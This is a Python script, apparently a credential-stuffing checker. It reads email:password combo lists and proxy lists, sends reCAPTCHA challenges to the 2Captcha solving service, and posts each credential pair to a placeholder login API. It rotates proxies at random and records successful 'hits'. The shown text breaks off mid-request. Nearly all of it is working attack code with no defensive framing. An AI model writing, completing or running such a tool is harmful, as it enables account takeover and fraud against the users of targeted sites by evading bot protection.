import requests
import random
import time

# Load combos and proxies
with open('combos.txt', 'r') as f:
    combos = [line.strip() for line in f if ':' in line]

with open('proxies.txt', 'r') as f:
    proxies = [line.strip() for line in f if ':' in line]

with open('2captcha_key.txt', 'r') as f:
    CAPTCHA_API_KEY = f.read().strip()

hits = []
captcha_blocks = []

def solve_captcha(site_key, url):
    # Send CAPTCHA to 2Captcha
    resp = requests.post("http://2captcha.com/in.php", data={
        'key': CAPTCHA_API_KEY,
        'method': 'userrecaptcha',
        'googlekey': site_key,
        'pageurl': url,
        'json': 1
    }).json()

    if resp.get("status") != 1:
        return None

    captcha_id = resp.get("request")
    # Poll for result
    for _ in range(20):
        time.sleep(5)
        result = requests.get("http://2captcha.com/res.php", params={
            'key': CAPTCHA_API_KEY,
            'action': 'get',
            'id': captcha_id,
            'json': 1
        }).json()
        if result.get("status") == 1:
            return result.get("request")
    return None

# Capturer logic
for combo in combos:
    email, password = combo.split(':', 1)
    proxy = random.choice(proxies)
    proxy_dict = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    }

    try:
        # Initial request
        response = requests.post(
            "https://targetsite.com/api/login",  # Replace with actual endpoint
            json={"email": email
